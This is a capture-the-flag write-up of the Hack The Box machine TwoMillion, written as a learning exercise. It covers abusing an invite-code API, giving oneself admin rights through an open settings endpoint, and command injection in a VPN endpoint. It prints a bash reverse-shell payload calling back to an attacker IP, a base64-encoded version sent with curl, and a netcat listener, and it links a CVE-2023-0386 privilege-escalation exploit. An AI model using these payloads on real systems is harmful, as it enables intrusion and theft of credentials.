---
title: "HTB TwoMillion Walkthrough"
date: "2025-04-16"

layout: ../../layouts/PostLayout.astro
description: "Detail walkthrough on hackthebox machine twomillion."

img_path : "/images/2milion/logo.png"
img_alt: "web image"
---

## Title: TwoMillion

## About TwoMillion

TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.

## 1. The Process

### Enumeration

Let’s begin with nmap

![CTF](/images/2milion/nmap.png)
There are 2 TCP ports open, i.e, port 22(ssh) and port 80(HTTP). Now, as a cyber security student, I can figure out that port 80 is vulnerable since it is running on the service HTTP, not HTTPS. 

Let’s check the website by pasting the machine’s IP into the browser. Before that, we need to add the IP address to the /etc/hosts file. 

![CTF](/images/2milion/website.png)
The website has login and join functionality. On clicking on join, we get the following page.

![CTF](/images/2milion/join.png)
When I click on the join HTB, it redirects to the /invite page

![CTF](/images/2milion/invite.png)
To sign up, I need an invite code. I have no idea how I would get the invite code or how to sign up. So I inspect the page, then refresh the page.

![CTF](/images/2milion/inviteapimin.png)
Under the Network tab, I found that the /invite page requests the JavaScript file inviteapi.min.js 

From the debugger tab, I looked at the inviteapi.min.js file. The JavaScript code seems to be obfuscated.

![CTF](/images/2milion/debugger.png)
```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

I asked my favorite AI assistance, ChatGPT, to de-obfuscate. And I got the following readable javascript code.

```jsx
function verifyInviteCode(code) {
  var formData = { "code": code };
  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: '/api/v1/invite/how/to/generate',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}
```

In the above javascript code there are two functions, one that verify the invite code and the others that make the invite code. The second function make a POST request to /api/v1/invite/how/to/generate.

 Let’s call this JavaScript function using cURL. 

```bash
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

Here I used the -s switch so that curl won't show the connection progress. I also use jq to
beautify the outputted JSON

![CTF](/images/2milion/curl.png)
From the above post request I got one hint. That is data is encrypted using the given encryption type “ROT13”. Let’s decrypt that data using the tool cyber chef.

![CTF](/images/2milion/decryption.png)
The plaintext that is hidden inside that ciphertext is “In order to generate the invite code, make a POST request to /api/v1/invite/generate”. 

So, in order to get the invite code, I have to make a post request to /api/v1/invite/generate endpoint.

```bash
#command to make post request using curl
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

![CTF](/images/2milion/base64.png)
The invite code is encoded in base64. let’s decode it. For that I will again use cyber chef. 

![CTF](/images/2milion/invitecode.png)
Now I have got the invite code. i.e. 2J8BU-LELSN-SOK66-0YS5U

Let’s sign up.

![CTF](/images/2milion/register.png)
I am redirected to /register endpoint. Now let’s register ourselves and login to the platform.

![CTF](/images/2milion/login.png)
 After filling up the details, I am redirected to /login. Let’s enter the details and login.

![CTF](/images/2milion/home.png)
And boom…. I have successfully logged in. The website is more or less similar to the real HTB platform. 

When I check the functionality of the website, I find that many functionalities are not working, only a few are working. 

Just like a HTB platform, that website also has the functionality to stabilize the connection. To get access to the lab, first I need to connect to the website. 

![CTF](/images/2milion/access.png)
I downloaded the connection pack, and then from a terminal I typed openvpn followed by filename of the connection pack.

![CTF](/images/2milion/ovpn.png)
It is not working. 

Both the connection pack and the regenerate button perform the same function, which is downloading the VPN file.

Let’s now send this over to Burp Suite and see what these two requests (connection pack and regenerate) exactly do.

![CTF](/images/2milion/intercept.png)
Send those two generate and regenerate URLs to the repeater.

![CTF](/images/2milion/generate.png)
![CTF](/images/2milion/regenerate.png)
Both are the same, just the endpoint is different.

Upon clicking on the button a GET request is sent out to /api/v1/users/vpn/generate and in return the VPN file for our current user is downloaded.

Let’s send a request to the URL /api/v1/users/vpn/generate on each of the endpoint to see if anything interesting is returned.

**vpn**

![CTF](/images/2milion/vpn.png)
It is moved permanently.

**user**

![CTF](/images/2milion/user.png)
it is also moved permanently

**v1**

![CTF](/images/2milion/v1.png)
It is giving a list of routes that are available in the API.

**api**

![CTF](/images/2milion/api.png)
It gives the 200 status code. Let’s play with the list of routes.

```jsx
{
    "v1": {
        "user": {
            "GET": {
                "/api/v1": "Route List",
                "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
                "/api/v1/invite/generate": "Generate invite code",
                "/api/v1/invite/verify": "Verify invite code",
                "/api/v1/user/auth": "Check if user is authenticated",
                "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
                "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
                "/api/v1/user/vpn/download": "Download OVPN file"
            },
            "POST": {
                "/api/v1/user/register": "Register a new user",
                "/api/v1/user/login": "Login with existing user"
            }
        },
        "admin": {
            "GET": {
                "/api/v1/admin/auth": "Check if user is admin"
            },
            "POST": {
                "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
            },
            "PUT": {
                "/api/v1/admin/settings/update": "Update user settings"
            }
        }
    }
}
```

Most of the routes for user are ones that I have seen already. Interesting ones are the admin endpoints. Let’s test those routes.

First, let’s check if the user is an admin.

![CTF](/images/2milion/adminauth.png)
The user it’s me, and I am not an admin, so the message is false.

Let’s generate a VPN for a specific user. (Keep in mind that this is POST request)

![CTF](/images/2milion/admingenerate.png)
As I am not an admin, this endpoint is unauthorized.

Let’s test the update user setting endpoint. There, I might change the user to an admin role. (keep in mind that this is PUT request)

![CTF](/images/2milion/adminsetting.png)
Wow, this time I don’t get an unauthorized error, but instead the API replies with
Invalid content type. I need to set the content type. In the response it is mentioned that content-type is json. 

![CTF](/images/2milion/contenttype.png)
There is a new error message that is email parameter is missing. Let’s add our user email.

![CTF](/images/2milion/email.png)
Again is_admin parameter is missing. Let’s add that also. is_admin parameter is a boolean datatype; we need to set it to either true or false. Since I want to set myself to an admin user, I set the value to true. (Keep in mind that is-admin parameter accepts either 0 or 1)

![CTF](/images/2milion/is_admin.png)
So I set the user doji as the admin. But let’s verify that it worked using the endpoint to check if user is admin.

![CTF](/images/2milion/check.png)
This time, the message is true, which means now I am the admin. 

This kind of vulnerability is IDOR, where I can enter the input in the update setting to get access.

/api/v1/admin/settings/update endpoint can change a user account to an admin account.

That’s the enumeration part. Now let’s play with those admin access endpoints.

### Gaining access

Earlier, I couldn’t generate a VPN for the user, now I am admin, let’s try to generate the VPN for the user. We can also run from terminal using curl. 

```bash
curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=5smrjjh2f709i5vgijph6a78aq" --header "Content-Type: application/json" | jq
```

![CTF](/images/2milion/uservpn.png)
username parameter is missing. Here admin can generate VPN for any user, so let’s give a random username.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=5smrjjh2f709i5vgijph6a78aq" --header "Content-Type: application/json" --data '{"username":"pokto"}'
```

![CTF](/images/2milion/itgenerate.png)
After sending the above command, I see that a VPN configuration file was generated for the user pokto. The username can be any.  It might be possible to inject malicious code in the username field and gain command execution on the remote system. Let’s try.

![CTF](/images/2milion/try.png)
I tried injecting the command, ;id; after username and that command is successful. So there comes the command injection vulnerability.

Let's start a Netcat listener to catch a shell.

```bash
nc -lvnp 4444
```

We can then get a shell with the following payload.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.61/4444 0>&1'
```

When I directly add that bash, my connection was redirected. 

![CTF](/images/2milion/redirect.png)
so I ask chatgpt and it give me base64 encoded payload for the above payload and it work.

```bash
curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=5smrjjh2f709i5vgijph6a78aq" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42MS80NDQ0IDA+JjE= | base64 -d | bash;"}'
```

![CTF](/images/2milion/connection.png)
I am in shell as www-data. My aim is to get admin shell. Let’s check each and every files and directory for the password.

![CTF](/images/2milion/password.png)
I found the hidden file .env, there is a DB_PASSWORD. Most of the time db password can be the password for the admin. Let’s reuse this password for admin and login from ssh. In nmap I found that ssh port is open.

![CTF](/images/2milion/admin.png)
Boom…I got the admin shell.

![CTF](/images/2milion/userflag.png)
Now I got the user flag, next task is to get root flag.  

### Privilege escalation

![CTF](/images/2milion/hidden.png)
I check the hidden directory. There's nothing in it. Let’s search for all the files that is owned by user admin.

```bash
find / -user admin 2>/dev/null
```

This is giving me a very long list. Let’s filter out those unnecessary ones.

```bash
find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```

![CTF](/images/2milion/mail.png)
I found an email with sensitive information. The email is from ch4p and is letting the admin know that he should perform updates on their web host os, as there have been some serious kernel exploits. More specifically, an exploit for OverlayFS / FUSE is mentioned.

ch4p has mentioned the vulnerability present in their system. But I don’t have knowledge about that, so let’s Google it together. 

After hours of searching, I finally found one GitHub repo that shows how to exploit with OverlayFS Privilege Escalation. [github link](https://github.com/sxlmnwb/CVE-2023-0386)

**step 1**: clone the repo

![CTF](/images/2milion/clone.png)
**step 2:** creates a compressed archive file of that folder.

```bash
tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386/
```

**Step 3** : Send this file from local machine to attack machine

Start a Python server on the local machine 

![CTF](/images/2milion/localmachine.png)
With the command wget, download the file on the attack machine.

![CTF](/images/2milion/attackmachine.png)
With this, now we have that CVE-2023-0386 file in our attack machine to gain root access.

**Step 4**: Unzip that file.

```bash
tar -xjvf CVE-2023-0386.tar.bz2
```

**step5:** cd to that folder and run “make all” command. (here i type only make. it should be ‘make all’)

![CTF](/images/2milion/make.png)
 

In the github direction to use is given;

![CTF](/images/2milion/howtouse.png)
**Step 6**: Start two terminals of the attack machine and run the above command separately.  

![CTF](/images/Anthem/1.png)
![CTF](/images/2milion/2.png)
And finally, I got the root shell.

## 2. Learning

- I encountered obfuscated code for the first time. Obfuscated code is source code intentionally made more difficult to understand and reverse engineer while still maintaining its original functionality.
- cURL is a command-line tool and library for transferring data with URLs. It sends and receives data over various network protocols, including HTTP, HTTPS, FTP, and more. It allows you to interact with web services and APIs from the command line.
- It is often for APIs to use JSON for sending and receiving data.
- IDOR are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. This allows attackers to manipulate these object references and gain access to data or perform actions they shouldn't be able to.
- Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application.
- OverlayFS is a union filesystem in Linux that merges two directories:

       **Lower Layer**: Typically read-only.

       **Upper Layer**: Writable, capturing changes

CVE-2023-0386 lies in the fact that when the kernel copied a file from the overlay file system to the "upper" directory, it did not check if the user/group owning this file was mapped in the current user namespace. This allows an unprivileged user to smuggle an SUID binary from a "lower" directory to the "upper" directory, by using OverlayFS as an intermediary.

The virtual machine is provisioned with an exploit merging the different pieces of this proof of concept repository into one single static binary. This binary creates folders tree under `/tmp/ovlcap` and starts FUSE filesystem which serves an suid executable. It then calls `unshare` with mount overlay command and copy of the lower suid executable. Finally, it runs the suid executable to spawn a root shell.

- CVE-2023-0386 is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits.

## 3. Reference List

https://app.hackthebox.com/machines/TwoMillion/information

https://youtu.be/Exl4P3fsF7U

[CVE-2023-0386]( https://github.com/sxlmnwb/CVE-2023-0386)